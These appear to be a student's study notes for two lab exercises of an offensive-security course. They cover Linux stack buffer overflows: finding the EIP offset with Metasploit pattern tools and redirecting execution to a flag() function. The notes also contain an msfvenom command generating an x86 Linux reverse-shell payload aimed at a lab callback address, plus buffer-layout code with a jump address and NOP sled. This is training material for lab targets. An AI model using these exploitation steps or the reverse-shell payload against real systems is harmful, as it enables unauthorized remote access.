
###### 12.3.3
Now it is time to practice controlling EIP, _Linux_ style. You just need to overwrite EIP to point to the memory address of the _flag()_ function inside the binary you find on VM #1 at _hXXps://\[VM#1_IP\]/execution-flow-linux_ to get the flag.  
Just like with the windows challenges, this binary reads from 'exploit.txt' by default locally and from STDIN (the socket) on the server.  
You also do not get a copy of the source code or a template to assist (but you didn't need them anyways).  
Once ready, launch your raw exploit against port 5000 on VM #1 to solve this challenge and get the flag.

```bash
msf-pattern_create -l 4000
```

~~**Add addt hex values** at beginning and at the end in order for the app to correctly crash:~~ Not needed for exercises, just the **crossfire** app

```bash
payload = "<pattern>"  
  
  
with open ("exploit.txt", "wb") as f:  
    f.write((payload))
```


**NOTE:** In order to get everything working & overwriting the **EIP** in [**edb**](edb.md):  
1. install **xterm**.  
2. cd to the directory w/ the binary & exploit.txt before running **edb**  

```bash
└─$ msf-pattern_offset -l 4000 -q 45377a45  
[*] Exact match at offset 3892
```

 
Test pattern match by passing ‘A’ * 3892 + ‘B’ * 4  


**Find flag() func addr:**  

In **edb** - Plugins > Function Finder  
Select binary & Search.  Filter for _flag_  
  
  
  

Redirect **EIP** to flag() func: 
**NOTE:** You may need to hit Run twice in **edb** to get it to trigger  

```bash
eip = "\x2b\x86\x04\x08"  
  
padding = "A" * 3892  
  
buffer = padding + eip  
  
with open ("exploit.txt", "wb") as f:  
    f.write(buffer)  
```




###### 12.3.4
We have released _PWK Shellcode Tester v3.0_ that is running on VM #1.  
This time, the program only accepts raw hex bytes. This updated service is available at _hXXps://\[VM#1_IP\]/shellcode-linux_.
Just like with the Windows BOFs module challenges, this binary reads from 'exploit.txt' by default locally and from STDIN (the socket) on the server.  
You can generate an x86 linux reverse shell shellcode in a raw format and forward it through netcat to VM#1 and get the flag.  
  
  
pattern offset = 98  
  
bad chars ---- **NOTE:** Had to put a breakpoint on the last **RET** to view **ESP** in dump properly as checking for bad chars wouldn't overflow the buffer (despite it being much larger than 98 chars)  
  
shellcode:  
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.231 LPORT=443 -b "x00\x0a\x0d\x1a\x43\x75\x9e\xbc" -f py -v shellcode
```


Plugins > Opcode Searcher > Opcode Search  
  
Search through the listed modules for **ESP -> EIP**  
	0x5e9a515e

```bash
eip = "\x5e\x51\x9a\x5e"  
  
nop = "\x90" * 16  
  
buffer = 'A' * 98 + eip + nop + shellcode + "\n"
```